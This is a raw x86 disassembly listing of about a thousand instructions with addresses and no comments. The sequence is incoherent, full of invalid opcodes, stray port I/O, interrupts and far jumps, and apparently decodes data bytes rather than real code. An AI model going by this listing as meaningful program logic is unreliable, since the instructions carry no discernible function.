  419c7c:	xchg   ebp,eax
  419c7d:	pop    esp
  419c7e:	pop    eax
  419c7f:	adc    esp,eax
  419c81:	mov    edi,0xfc1603e0
  419c86:	cld    
  419c87:	stos   BYTE PTR es:[edi],al
  419c88:	int    0x68
  419c8a:	ins    BYTE PTR es:[edi],dx
  419c8b:	mov    BYTE PTR [ebx-0xa],dl
  419c8e:	and    edx,eax
  419c90:	dec    esp
  419c91:	rol    BYTE PTR [ebx+0x6bbd6fc4],0xde
  419c98:	dec    ebx
  419c99:	push   ds
  419c9a:	imul   ebp,DWORD PTR [ebx+0x10df07b4],0x5b7c193b
  419ca4:	xchg   esi,eax
  419ca5:	xor    edx,DWORD PTR [eax]
  419ca7:	mov    esi,0xb5f5a3ec
  419cac:	cmp    al,0xd3
  419cae:	jmp    0x266d:0xa4f4b9ca
  419cb5:	ror    DWORD PTR [esi-0x266134ff],0xdc
  419cbc:	or     eax,0x54c5c296
  419cc1:	aas    
  419cc2:	dec    edi
  419cc3:	xchg   esi,eax
  419cc4:	jl     0x419cb8
  419cc6:	into   
  419cc7:	test   DWORD PTR [ebp-0x171ec5c3],edi
  419ccd:	jmp    0x419d2c
  419ccf:	mov    WORD PTR [ebp*4+0x52d5f111],ss
  419cd6:	mov    bh,0x4c
  419cd8:	xor    al,0xcf
  419cda:	push   ecx
  419cdb:	ins    BYTE PTR es:[edi],dx
  419cdc:	je     0x419c98
  419cde:	push   es
  419cdf:	mov    esp,0x7cb3a786
  419ce4:	mov    esi,0x46e811a5
  419ce9:	add    DWORD PTR [edi],ebp
  419ceb:	xchg   BYTE PTR [ebx],cl
  419ced:	stos   DWORD PTR es:[edi],eax
  419cee:	into   
  419cef:	pusha  
  419cf0:	adc    BYTE PTR [esi-0x22cf4d86],cl
  419cf6:	inc    edx
  419cf7:	fmulp  st(2),st
  419cf9:	aaa    
  419cfa:	in     eax,0x5
  419cfc:	mov    ebx,0xcf1ce5ff
  419d01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d02:	push   esi
  419d03:	fisttp DWORD PTR [esi-0x46]
  419d06:	mov    bh,0xf9
  419d08:	lods   eax,DWORD PTR ds:[esi]
  419d09:	mov    edi,0xfebb36c2
  419d0e:	add    eax,0xce955372
  419d13:	push   0xd5b13f50
  419d18:	sti    
  419d19:	xor    eax,0x73c020c6
  419d1e:	in     eax,dx
  419d1f:	pop    es
  419d20:	push   ds
  419d21:	push   0x10
  419d23:	mov    WORD PTR [edi],ss
  419d25:	xchg   edi,eax
  419d26:	xor    al,0x57
  419d28:	jno    0x419ce7
  419d2a:	sbb    BYTE PTR [edi],bh
  419d2c:	push   cs
  419d2d:	xor    ch,dl
  419d2f:	stos   DWORD PTR es:[edi],eax
  419d30:	(bad)  
  419d31:	adc    al,bh
  419d33:	stc    
  419d34:	push   esi
  419d35:	sbb    bl,bl
  419d37:	xchg   edi,eax
  419d38:	sbb    eax,DWORD PTR [eax-0x5b]
  419d3b:	outs   dx,DWORD PTR ds:[esi]
  419d3c:	jge    0x419ce8
  419d3e:	(bad)  
  419d3f:	out    0x4d,eax
  419d41:	or     DWORD PTR [ebx+0x1b0d7adc],esi
  419d47:	dec    esp
  419d48:	pushf  
  419d49:	bound  ecx,QWORD PTR [esi+0x49]
  419d4c:	in     eax,dx
  419d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419d4e:	pop    esi
  419d4f:	cmp    DWORD PTR ds:0xd811870d,edx
  419d55:	sub    al,0xd0
  419d57:	imul   ebx,DWORD PTR [edx+0x243ee269],0xf168c7aa
  419d61:	arpl   WORD PTR [ebx+eax*8],dx
  419d64:	xor    BYTE PTR [ebx+0x39],ch
  419d67:	and    DWORD PTR [eax],0xffffffae
  419d6a:	push   ecx
  419d6b:	push   edi
  419d6c:	xor    eax,0xb81023e0
  419d71:	imul   BYTE PTR [edi]
  419d73:	fsubr  QWORD PTR [edi]
  419d75:	leave  
  419d76:	add    DWORD PTR [ebx-0x65],edi
  419d79:	sbb    dl,BYTE PTR [ecx]
  419d7b:	sbb    DWORD PTR cs:[edx+0x4b],ebp
  419d7f:	dec    ebx
  419d80:	stos   BYTE PTR es:[edi],al
  419d81:	out    dx,eax
  419d82:	mov    ds:0x5d635261,eax
  419d87:	mov    ebp,0x6cb90992
  419d8c:	outs   dx,DWORD PTR ds:[esi]
  419d8d:	fcmovb st,st(5)
  419d8f:	lds    eax,FWORD PTR [ecx+0x6]
  419d92:	idiv   BYTE PTR [ebp+edi*8+0x48]
  419d96:	fisubr DWORD PTR [edi+0x7be8edca]
  419d9c:	pop    es
  419d9d:	cmp    al,0x97
  419d9f:	push   esi
  419da0:	ret    0xc762
  419da3:	pop    eax
  419da4:	pop    ds
  419da5:	jecxz  0x419d89
  419da7:	xchg   dx,ax
  419da9:	inc    esi
  419daa:	imul   edx,DWORD PTR [edx+0x72],0x4327fbd2
  419db1:	js     0x419d47
  419db3:	push   0x7a
  419db5:	mov    esi,DWORD PTR [eax-0x5a7a614f]
  419dbb:	pop    esp
  419dbc:	rcr    DWORD PTR [eax],1
  419dbe:	jae    0x419ddc
  419dc0:	mov    esi,0x5cd31e70
  419dc5:	(bad)  
  419dc6:	stc    
  419dc7:	ds adc al,0x98
  419dca:	sbb    eax,0x3529a7df
  419dcf:	aam    0xde
  419dd1:	or     bl,dh
  419dd3:	(bad)  
  419dd4:	jmp    0xa46e:0x931cd774
  419ddb:	mov    ebx,0x9bd10224
  419de0:	push   eax
  419de1:	mov    ds:0xbad76a3a,eax
  419de6:	adc    al,0x9f
  419de8:	push   ax
  419dea:	xchg   ebx,eax
  419deb:	jne    0x419e04
  419ded:	ds cli 
  419def:	pop    edx
  419df0:	rol    DWORD PTR [ebx],0x63
  419df3:	or     al,0x30
  419df5:	and    ah,cl
  419df7:	repz cwde 
  419df9:	jno    0x419dea
  419dfb:	sti    
  419dfc:	mov    dl,0xd2
  419dfe:	sub    ah,bh
  419e00:	xchg   ecx,eax
  419e01:	dec    edx
  419e02:	ret    0x643b
  419e05:	mov    ?,WORD PTR [esi+eax*4]
  419e08:	mov    cl,0xc8
  419e0a:	fcom   QWORD PTR [edx+eiz*8+0x2d4abdb0]
  419e11:	or     DWORD PTR [ecx+0x2e],ebx
  419e14:	mov    ecx,0x53cc19e
  419e19:	jl     0x419dbe
  419e1b:	imul   edx,DWORD PTR [edi-0x44],0xffffffd9
  419e1f:	jp     0x419dce
  419e21:	push   edi
  419e22:	sub    ah,al
  419e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e25:	loope  0x419df7
  419e27:	xor    eax,0x5a6c7a21
  419e2c:	push   ecx
  419e2d:	sbb    dl,BYTE PTR [eax-0x45156f0c]
  419e33:	shl    DWORD PTR [ebx+eiz*2-0x7b],1
  419e37:	push   ebp
  419e38:	mov    edx,es
  419e3a:	pop    edi
  419e3b:	add    al,0xca
  419e3d:	push   esp
  419e3e:	cld    
  419e3f:	push   eax
  419e40:	mov    ebx,0x98042483
  419e45:	data16 (bad) 
  419e48:	mov    ebp,0x79155d90
  419e4d:	sub    esp,DWORD PTR [ebp+0xf]
  419e50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e51:	nop
  419e52:	mov    esi,0x6fce1035
  419e57:	adc    esi,esi
  419e59:	out    dx,eax
  419e5a:	ret    0xf19b
  419e5d:	daa    
  419e5e:	push   cs
  419e5f:	in     eax,0x84
  419e61:	ins    BYTE PTR es:[edi],dx
  419e62:	int    0x94
  419e64:	test   DWORD PTR [ebx],edi
  419e66:	add    eax,0x3d13e4c1
  419e6b:	popf   
  419e6c:	and    DWORD PTR [edx+0x20b4b3d4],esi
  419e72:	sbb    ebx,DWORD PTR [esi+esi*4-0x13]
  419e76:	stos   DWORD PTR es:[edi],eax
  419e77:	fild   WORD PTR ds:0x2856d257
  419e7d:	outs   dx,BYTE PTR ds:[esi]
  419e7e:	jo     0x419e1a
  419e80:	mov    ch,0x3
  419e82:	mov    al,0x40
  419e84:	jb     0x419e40
  419e86:	rcl    ebp,1
  419e88:	ret    0x3147
  419e8b:	push   cs
  419e8c:	xor    edx,DWORD PTR [ebp+0x4931bf38]
  419e92:	jnp    0x419e3a
  419e94:	xchg   DWORD PTR [ecx],esp
  419e96:	test   DWORD PTR [ebp+0x374e6678],eax
  419e9c:	arpl   WORD PTR [eax],cx
  419e9e:	popa   
  419e9f:	pop    ebp
  419ea0:	xor    al,0x5d
  419ea2:	mov    edi,0xccba6f55
  419ea7:	cmp    bh,BYTE PTR [ecx]
  419ea9:	and    bl,bh
  419eab:	cmp    eax,0x4baf2fb0
  419eb0:	pop    eax
  419eb1:	ds pop ds
  419eb3:	xor    ah,0x9b
  419eb6:	mov    fs,WORD PTR [esi]
  419eb8:	ja     0x419e5b
  419eba:	popf   
  419ebb:	xor    eax,0xd26a2896
  419ec0:	clc    
  419ec1:	inc    esi
  419ec2:	mov    DWORD PTR [ebp+0x6ba9989a],edi
  419ec8:	mov    eax,0x6d380428
  419ecd:	and    DWORD PTR [esi*1-0x63c0c2a2],0x28
  419ed5:	xchg   ebx,eax
  419ed6:	pcmpgtd mm4,QWORD PTR [eax]
  419ed9:	mov    al,BYTE PTR [edx]
  419edb:	jns    0x419ee1
  419edd:	aam    0x3e
  419edf:	out    dx,al
  419ee0:	add    al,0x2f
  419ee2:	aaa    
  419ee3:	int    0x87
  419ee5:	shr    DWORD PTR [eax],cl
  419ee7:	cmp    dh,BYTE PTR [edi+0x4e]
  419eea:	push   eax
  419eeb:	mov    bh,0x58
  419eed:	sbb    eax,0x86031753
  419ef2:	enter  0x2cc7,0xb5
  419ef6:	stos   DWORD PTR es:[edi],eax
  419ef7:	ins    DWORD PTR es:[edi],dx
  419ef8:	lock xor bl,BYTE PTR [ebx+0x193215c8]
  419eff:	cmp    esp,ebp
  419f01:	fwait
  419f02:	pop    ebx
  419f03:	mov    edi,0xa5b235ff
  419f08:	add    eax,0xd3672fb9
  419f0d:	int3   
  419f0e:	in     eax,0xb
  419f10:	stc    
  419f11:	push   ebp
  419f12:	ja     0x419f8d
  419f14:	shl    BYTE PTR [ecx+0x764d473d],0x57
  419f1b:	les    ebx,FWORD PTR [ebx]
  419f1d:	lock out 0x7e,eax
  419f20:	dec    ebp
  419f21:	sub    eax,0x7af97b26
  419f26:	pop    ebp
  419f27:	xor    BYTE PTR [ebp+0x0],al
  419f2a:	push   edx
  419f2b:	jae    0x419f8f
  419f2d:	jb     0x419f7e
  419f2f:	test   al,0xa0
  419f31:	xor    cl,BYTE PTR [ecx+ebx*8]
  419f34:	(bad)  
  419f35:	mov    ds:0x4c6f04a4,al
  419f3a:	xchg   ebx,eax
  419f3b:	int    0x51
  419f3d:	inc    esi
  419f3e:	scas   al,BYTE PTR es:[edi]
  419f3f:	sub    al,0x50
  419f41:	stos   DWORD PTR es:[edi],eax
  419f42:	cmp    ah,bl
  419f44:	loope  0x419f1a
  419f46:	cdq    
  419f47:	xchg   esp,eax
  419f48:	xchg   DWORD PTR [ebx+0x255de470],eax
  419f4e:	call   0x34fc:0x588fd422
  419f55:	ret    0xe503
  419f58:	and    DWORD PTR [ebp+0x2b2fb670],ecx
  419f5e:	inc    ecx
  419f5f:	sbb    DWORD PTR [edi],0xac5f003c
  419f65:	push   ebx
  419f66:	imul   DWORD PTR [ebp-0x65]
  419f69:	test   DWORD PTR [edi+0x5c],0xfa2b8cc
  419f70:	arpl   ax,cx
  419f72:	mov    bl,0x50
  419f74:	and    BYTE PTR ds:0xe8e391f1,al
  419f7a:	imul   eax,edx,0xffffffde
  419f7d:	xor    BYTE PTR [ebx+0x5513c1cb],al
  419f83:	jecxz  0x419f9b
  419f85:	adc    DWORD PTR [ecx+0x4a],ecx
  419f88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f89:	je     0x419f76
  419f8b:	push   cs
  419f8c:	add    eax,0xbb563523
  419f91:	stos   BYTE PTR es:[edi],al
  419f92:	sbb    BYTE PTR ds:0x133c07fa,ch
  419f98:	inc    ebp
  419f99:	pop    ecx
  419f9a:	jle    0x419fb0
  419f9c:	daa    
  419f9d:	jg     0x419fe9
  419f9f:	pop    edi
  419fa0:	ins    DWORD PTR es:[edi],dx
  419fa1:	scas   eax,DWORD PTR es:[edi]
  419fa2:	dec    ecx
  419fa3:	pop    ecx
  419fa4:	push   ebp
  419fa5:	mov    fs,WORD PTR [esi+eax*4-0x733c64b0]
  419fac:	mov    dh,0x4
  419fae:	sbb    ecx,DWORD PTR [ebx-0x59f73b8c]
  419fb4:	aam    0x83
  419fb6:	(bad)  
  419fb7:	jae    0x41a002
  419fb9:	sbb    BYTE PTR [eax-0x13a2e7fb],ah
  419fbf:	stc    
  419fc0:	ror    esp,1
  419fc2:	cdq    
  419fc3:	icebp  
  419fc4:	mov    ecx,0x9edd5e6c
  419fc9:	adc    eax,0x8cb5a124
  419fce:	push   eax
  419fcf:	in     eax,0x8d
  419fd1:	mov    edx,0x7ae67cef
  419fd6:	sub    edi,DWORD PTR [eax+edi*4-0x77]
  419fda:	ret    
  419fdb:	jmp    0xd947:0x285276bf
  419fe2:	call   FWORD PTR [ecx-0x65]
  419fe5:	cwde   
  419fe6:	push   edi
  419fe7:	or     BYTE PTR [esp+ebx*1+0x71016a1a],cl
  419fee:	stos   BYTE PTR es:[edi],al
  419fef:	pop    es
  419ff0:	(bad)  
  419ff1:	pop    ebx
  419ff2:	lea    ebx,[esi]
  419ff4:	cmc    
  419ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ff6:	and    eax,0xb8ae78f6
  419ffb:	xor    edi,edi
  419ffd:	adc    ch,BYTE PTR cs:[esi]
  41a000:	test   BYTE PTR [esi+0x5ef08655],cl
  41a006:	in     eax,dx
  41a007:	adc    al,0xf3
  41a009:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a00a:	lea    eax,[ecx+0x7e]
  41a00d:	sub    esi,DWORD PTR [esi-0x2]
  41a010:	jns    0x419feb
  41a012:	fwait
  41a013:	add    edx,DWORD PTR [edi]
  41a015:	or     eax,DWORD PTR [ecx]
  41a017:	push   ebx
  41a018:	push   esp
  41a019:	sub    al,0xe3
  41a01b:	mov    edx,0xf2dd39ac
  41a020:	mov    dl,0xfc
  41a022:	pop    es
  41a023:	popa   
  41a024:	mov    eax,0xd51723bd
  41a029:	adc    bh,ch
  41a02b:	xor    BYTE PTR [ecx+0x72],dh
  41a02e:	imul   ecx,DWORD PTR [eax-0x3c25f04e],0xffffffbc
  41a035:	or     eax,0x39225ec4
  41a03a:	or     al,0xe3
  41a03c:	lods   eax,DWORD PTR ds:[esi]
  41a03d:	pop    edi
  41a03e:	das    
  41a03f:	out    0x1e,al
  41a041:	sbb    ebx,DWORD PTR [esi+0x564cef39]
  41a047:	pop    ebp
  41a048:	jo     0x41a03d
  41a04a:	push   edi
  41a04b:	mov    bl,0x52
  41a04d:	adc    DWORD PTR [ebx],0x4428fc99
  41a053:	test   DWORD PTR cs:[ebx-0x4031098f],eax
  41a05a:	inc    esi
  41a05b:	(bad)  
  41a05c:	loope  0x41a01c
  41a05e:	mov    eax,ds:0x15532962
  41a063:	or     al,0xbc
  41a065:	pop    edi
  41a066:	and    esp,0xffffffc8
  41a069:	mov    bl,0x91
  41a06b:	in     eax,dx
  41a06c:	inc    DWORD PTR [ebx-0x3405e199]
  41a072:	pusha  
  41a073:	imul   ecx,DWORD PTR fs:[edi],0x34
  41a077:	lods   al,BYTE PTR ds:[esi]
  41a078:	push   0x776e21f7
  41a07d:	pushf  
  41a07e:	int    0x98
  41a080:	dec    edi
  41a081:	cmp    al,0x2a
  41a083:	fistp  DWORD PTR [esi+edi*8-0x1d]
  41a087:	into   
  41a088:	xor    eax,0xe5c3346
  41a08d:	cmp    BYTE PTR [esi+ecx*2+0x1c9b56a7],dh
  41a094:	mov    esi,0xc494aa26
  41a099:	cmc    
  41a09a:	retf   0x776
  41a09d:	push   0x3a
  41a09f:	add    bl,BYTE PTR [ebx-0x7ef475d8]
  41a0a5:	ins    BYTE PTR es:[edi],dx
  41a0a6:	jecxz  0x41a049
  41a0a8:	xchg   ecx,eax
  41a0a9:	xchg   BYTE PTR [ebx+esi*4-0x527e9431],ch
  41a0b0:	stos   BYTE PTR es:[edi],al
  41a0b1:	cmc    
  41a0b2:	loopne 0x41a123
  41a0b4:	aam    0x9d
  41a0b6:	popf   
  41a0b7:	retf   
  41a0b8:	mov    eax,ds:0x3212d86e
  41a0be:	cs xchg ebp,eax
  41a0c0:	or     DWORD PTR [ecx+0x746355c6],eax
  41a0c6:	enter  0x7e02,0x1b
  41a0ca:	lods   al,BYTE PTR ds:[esi]
  41a0cb:	sub    DWORD PTR [ebp+0xb],ebp
  41a0ce:	mov    DWORD PTR [edx-0x601686a],edx
  41a0d4:	stos   BYTE PTR es:[edi],al
  41a0d5:	sbb    esp,DWORD PTR [edi+0x47]
  41a0d8:	shl    DWORD PTR [esi-0xe],cl
  41a0db:	int    0x75
  41a0dd:	repz gs inc ecx
  41a0e0:	gs sub dh,0x70
  41a0e4:	and    cl,BYTE PTR ds:0xefd9d73a
  41a0ea:	ja     0x41a0b8
  41a0ec:	std    
  41a0ed:	and    ch,BYTE PTR [ecx]
  41a0ef:	aaa    
  41a0f0:	cli    
  41a0f1:	dec    edx
  41a0f2:	es and eax,0xa12abd1e
  41a0f8:	xor    al,0xfe
  41a0fa:	jl     0x41a136
  41a0fc:	and    ebx,DWORD PTR [eax+0x4bcb51db]
  41a102:	xor    bl,BYTE PTR [ecx]
  41a104:	sub    ecx,DWORD PTR [esp+edi*4+0x6f]
  41a108:	xchg   BYTE PTR [edi],cl
  41a10a:	inc    edi
  41a10b:	or     BYTE PTR [ebp+eiz*8-0x5336cb2d],0x81
  41a113:	dec    esi
  41a114:	mov    edx,0xc17b3b92
  41a119:	dec    ebx
  41a11a:	jmp    0x41a133
  41a11c:	sti    
  41a11d:	xor    esp,DWORD PTR [ebx+eiz*4-0xa]
  41a121:	(bad)  ds:0xce73fcf3
  41a127:	ror    BYTE PTR [esi-0x607cc88c],0x34
  41a12e:	pop    eax
  41a12f:	popa   
  41a130:	push   ebx
  41a131:	jb     0x41a1a5
  41a133:	push   cs
  41a134:	push   ss
  41a135:	call   0x1c234148
  41a13a:	push   edx
  41a13b:	gs js  0x41a1bd
  41a13e:	cs loop 0x41a18d
  41a141:	cld    
  41a142:	je     0x41a17f
  41a144:	inc    eax
  41a145:	sbb    BYTE PTR [edx+ebp*2-0x6c2381d5],ch
  41a14c:	neg    DWORD PTR [ebx+ebx*1]
  41a14f:	ror    cl,1
  41a151:	dec    ebp
  41a152:	push   esi
  41a153:	inc    ecx
  41a154:	sub    DWORD PTR [edi+0x7b],esp
  41a157:	mov    ds:0xf81a3b4b,al
  41a15c:	loope  0x41a143
  41a15e:	pop    ebx
  41a15f:	imul   BYTE PTR [edx+0x34]
  41a162:	test   eax,0xc48b5cec
  41a167:	xor    al,0x73
  41a169:	xor    dh,bl
  41a16b:	cmp    BYTE PTR [bx-0x3e],dl
  41a16f:	mov    bh,bl
  41a171:	mov    edx,gs
  41a173:	push   esp
  41a174:	(bad)  
  41a175:	pop    ecx
  41a176:	cwde   
  41a177:	ins    BYTE PTR es:[edi],dx
  41a178:	bound  edx,QWORD PTR [ecx-0x7d4561c5]
  41a17e:	or     BYTE PTR [edx+0x52ce3951],bl
  41a184:	xchg   ebx,eax
  41a185:	repz adc eax,0xf3e9b562
  41a18b:	inc    edi
  41a18c:	inc    edi
  41a18d:	repnz neg BYTE PTR [esi]
  41a190:	pop    ss
  41a191:	cld    
  41a192:	sub    BYTE PTR [ebx],al
  41a194:	xor    bh,BYTE PTR [eax+0x4a]
  41a197:	pop    ds
  41a198:	cmc    
  41a199:	jge    0x41a201
  41a19b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a19c:	xor    DWORD PTR [esp+edi*1+0x3a],esi
  41a1a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1a1:	(bad)  
  41a1a2:	push   eax
  41a1a3:	ja     0x41a159
  41a1a5:	dec    esi
  41a1a6:	data16 mov ah,0xc6
  41a1a9:	mov    al,0xa8
  41a1ab:	sahf   
  41a1ac:	xchg   edi,eax
  41a1ad:	inc    esi
  41a1ae:	scas   eax,DWORD PTR es:[edi]
  41a1af:	push   ecx
  41a1b0:	or     dl,BYTE PTR [ecx-0x6c65ef4c]
  41a1b6:	inc    edi
  41a1b7:	mov    edx,0x6a773cc4
  41a1bc:	add    ecx,DWORD PTR [ecx-0x23be8ef0]
  41a1c2:	push   ds
  41a1c3:	sub    ch,ch
  41a1c5:	scas   al,BYTE PTR es:[edi]
  41a1c6:	fadd   DWORD PTR [ecx]
  41a1c8:	cs data16 cli 
  41a1cb:	sahf   
  41a1cc:	stc    
  41a1cd:	xchg   ecx,eax
  41a1ce:	sbb    al,0xcd
  41a1d0:	sub    ecx,DWORD PTR [ebp-0x5d53e47b]
  41a1d6:	outs   dx,BYTE PTR ds:[esi]
  41a1d7:	or     al,0xf4
  41a1d9:	xor    cl,BYTE PTR [ecx+esi*8]
  41a1dc:	xchg   ebp,eax
  41a1dd:	pusha  
  41a1de:	cmc    
  41a1df:	into   
  41a1e0:	lea    esp,ds:0xaeed2717
  41a1e6:	dec    eax
  41a1e7:	fdiv   DWORD PTR [esi+ebp*8]
  41a1ea:	sub    al,cl
  41a1ec:	jns    0x41a190
  41a1ee:	xor    eax,0x9017362f
  41a1f3:	test   BYTE PTR [edi+edx*4],ah
  41a1f6:	xor    DWORD PTR [edi+0x77ad7d2],esp
  41a1fc:	lea    edx,[ecx+0x37]
  41a1ff:	dec    edx
  41a200:	ret    0x1232
  41a203:	int    0x9b
  41a205:	dec    ebx
  41a206:	mov    eax,0x1a5a077a
  41a20b:	bound  esp,QWORD PTR [ebx+0x7]
  41a20e:	pop    esi
  41a20f:	lds    edx,FWORD PTR [ebx+0x61ce21b8]
  41a215:	rol    BYTE PTR [ebp+0xa],1
  41a218:	cdq    
  41a219:	jns    0x41a1be
  41a21b:	mov    edx,0xd13704e7
  41a220:	jns    0x41a213
  41a222:	jbe    0x41a235
  41a224:	das    
  41a225:	xchg   esi,eax
  41a226:	pop    eax
  41a227:	sub    cl,cl
  41a229:	test   ebp,0x7499eb49
  41a22f:	dec    edx
  41a230:	and    DWORD PTR [ebp+edx*8+0x6e706f49],0x1b1cc203
  41a23b:	adc    ebx,DWORD PTR [ebx+0x1211077f]
  41a241:	pop    ebp
  41a242:	dec    eax
  41a243:	inc    edx
  41a244:	sbb    al,0x78
  41a246:	stos   BYTE PTR es:[edi],al
  41a247:	xor    eax,0x90ee8420
  41a24c:	call   DWORD PTR [edx-0xc]
  41a24f:	xchg   ebp,eax
  41a250:	bound  eax,QWORD PTR [ecx-0xc]
  41a253:	push   ds
  41a254:	popa   
  41a255:	mov    dl,BYTE PTR [eax-0x46370f37]
  41a25b:	inc    ecx
  41a25c:	les    edi,FWORD PTR [ebp+0x2a577c66]
  41a262:	lock sub al,0x95
  41a265:	sub    ebp,esi
  41a267:	and    al,0x85
  41a269:	pop    esi
  41a26a:	hlt    
  41a26b:	aas    
  41a26c:	ss loopne 0x41a2e4
  41a26f:	out    dx,al
  41a270:	fild   DWORD PTR [ebx+0x63]
  41a273:	pmullw mm2,mm3
  41a276:	xchg   edi,eax
  41a277:	rcr    DWORD PTR [ebx+0x6d],1
  41a27a:	test   eax,0x85652255
  41a27f:	clc    
  41a280:	popf   
  41a281:	lods   al,BYTE PTR ds:[esi]
  41a282:	repnz loope 0x41a26c
  41a285:	cmp    al,0x54
  41a287:	sub    al,0xf3
  41a289:	adc    al,BYTE PTR [ebx]
  41a28b:	inc    edx
  41a28c:	adc    al,0x4f
  41a28e:	or     BYTE PTR ds:0xbc27a5b7,bl
  41a294:	sub    esi,DWORD PTR [ecx-0x43b17c19]
  41a29a:	fs cmp eax,edx
  41a29d:	lahf   
  41a29e:	les    esi,FWORD PTR [eax-0x4187f600]
  41a2a4:	push   ds
  41a2a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a6:	adc    al,0xe5
  41a2a8:	ins    BYTE PTR es:[edi],dx
  41a2a9:	mov    ds,WORD PTR [ebx+ecx*4-0x44]
  41a2ad:	loope  0x41a309
  41a2af:	shr    edi,0xdb
  41a2b2:	xor    esp,DWORD PTR [ebx+ecx*2+0x6cf2464c]
  41a2b9:	mov    al,0xdf
  41a2bb:	adc    BYTE PTR [edx],ch
  41a2bd:	pop    ss
  41a2be:	push   0xffffffb1
  41a2c0:	in     eax,0xcc
  41a2c2:	pop    edx
  41a2c3:	push   0x61
  41a2c5:	adc    al,dh
  41a2c7:	mov    esp,0x6e4a3387
  41a2cc:	mov    bh,0x5
  41a2ce:	call   0x268b:0x296a7fe2
  41a2d5:	push   ebx
  41a2d6:	repnz stc 
  41a2d8:	jmp    DWORD PTR [edi]
  41a2da:	lods   al,BYTE PTR ds:[esi]
  41a2db:	in     eax,dx
  41a2dc:	out    0xe3,al
  41a2de:	ret    
  41a2df:	mov    ch,0x2a
  41a2e1:	adc    ah,bh
  41a2e3:	cmc    
  41a2e4:	push   ss
  41a2e5:	rcr    DWORD PTR [edi+0x366f02c9],1
  41a2eb:	cmp    BYTE PTR [edi+eiz*2],bh
  41a2ee:	js     0x41a2ae
  41a2f0:	ds aam 0x65
  41a2f3:	mov    bh,0xe3
  41a2f5:	push   es
  41a2f6:	push   edx
  41a2f7:	inc    eax
  41a2f8:	cld    
  41a2f9:	push   ebp
  41a2fa:	adc    BYTE PTR [esi],0xcb
  41a2fd:	gs xchg edx,eax
  41a2ff:	dec    ebp
  41a300:	(bad)  
  41a301:	or     BYTE PTR [edi+edx*8+0x26],ah
  41a305:	in     al,0x64
  41a307:	loop   0x41a339
  41a309:	(bad)  [eax]
  41a30b:	stos   BYTE PTR es:[edi],al
  41a30c:	data16 sbb cl,0xd9
  41a310:	mov    edx,0xede48cc8
  41a315:	mov    edi,0x9ce24209
  41a31a:	test   eax,0xf35c1897
  41a31f:	loop   0x41a34b
  41a321:	inc    esp
  41a322:	xor    cl,BYTE PTR [edx]
  41a324:	and    DWORD PTR [edi-0x6b3a8f9],ecx
  41a32a:	and    eax,0x92fc785e
  41a32f:	mov    ebp,0xea74d404
  41a334:	in     al,dx
  41a335:	sbb    eax,0x503d0dd3
  41a33a:	mov    BYTE PTR [edx-0x38e0320e],dh
  41a340:	fs or  eax,0xffdbca6d
  41a346:	out    dx,eax
  41a347:	icebp  
  41a348:	(bad)  
  41a349:	mov    WORD PTR [edi],es
  41a34b:	(bad)  
  41a34c:	repnz or esp,edi
  41a34f:	sbb    ch,al
  41a351:	adc    DWORD PTR [ecx-0x4eea52d4],esi
  41a357:	pop    esp
  41a358:	cmp    al,0x82
  41a35a:	adc    BYTE PTR [ecx],ch
  41a35c:	and    eax,0x68efec34
  41a361:	jmp    0x5304d1a0
  41a366:	mov    ebp,0x50d545cb
  41a36b:	cmp    ebp,DWORD PTR [ecx]
  41a36d:	xlat   BYTE PTR ds:[ebx]
  41a36e:	adc    eax,0xc7a34f29
  41a373:	inc    ebp
  41a374:	pop    ds
  41a375:	add    DWORD PTR [edx],0x5c
  41a378:	popf   
  41a379:	clc    
  41a37a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a37c:	loopne 0x41a33f
  41a37e:	pop    eax
  41a37f:	sbb    DWORD PTR [ebx+0x4cc21253],0xffffffa2
  41a386:	iret   
  41a387:	mov    edx,0x8f4a742b
  41a38c:	push   0x1cf08a61
  41a391:	outs   dx,DWORD PTR ds:[esi]
  41a392:	add    eax,0xaf6ffedb
  41a397:	sbb    bh,ah
  41a399:	mov    ch,0x54
  41a39b:	aam    0xfe
  41a39d:	dec    edi
  41a39e:	outs   dx,DWORD PTR ds:[esi]
  41a39f:	(bad)  
  41a3a1:	jae    0x41a3d9
  41a3a3:	mov    esi,0xcbe4f6de
  41a3a8:	inc    esi
  41a3a9:	mov    bh,0x21
  41a3ab:	jmp    0x5ef811be
  41a3b0:	in     eax,0x5e
  41a3b2:	push   es
  41a3b3:	dec    ebp
  41a3b4:	sub    bh,BYTE PTR [esp+eiz*8]
  41a3b7:	pop    edi
  41a3b8:	mov    ch,0xf9
  41a3ba:	lahf   
  41a3bb:	fwait
  41a3bc:	jb     0x41a421
  41a3be:	mov    dh,0x99
  41a3c0:	mov    dl,0x19
  41a3c2:	push   ds
  41a3c3:	rcr    DWORD PTR [edi+ecx*1+0x59],1
  41a3c7:	jmp    0x41a428
  41a3c9:	(bad)  
  41a3ca:	or     ebp,edx
  41a3cc:	lods   eax,DWORD PTR ds:[esi]
  41a3cd:	push   ebp
  41a3ce:	sahf   
  41a3cf:	xchg   esp,eax
  41a3d0:	mov    bl,0xcf
  41a3d2:	push   edi
  41a3d3:	pusha  
  41a3d4:	jne    0x41a3d5
  41a3d6:	loop   0x41a36c
  41a3d8:	enter  0x516d,0x41
  41a3dc:	add    DWORD PTR [ebx+0x7b],esp
  41a3df:	dec    ebx
  41a3e0:	mov    al,ds:0x98093ceb
  41a3e5:	mov    eax,0x444f6d68
  41a3ea:	mov    BYTE PTR [eax+0x3e],ch
  41a3ed:	test   edx,edi
  41a3ef:	(bad)  
  41a3f0:	fbld   TBYTE PTR [ebx-0x75852146]
  41a3f6:	push   es
  41a3f7:	push   ecx
  41a3f8:	mov    al,0x46
  41a3fa:	pusha  
  41a3fb:	pushf  
  41a3fc:	push   0xffffffa2
  41a3fe:	fld    QWORD PTR [ebx-0x23]
  41a401:	(bad)  
  41a402:	icebp  
  41a403:	mov    dl,bl
  41a405:	aam    0x9e
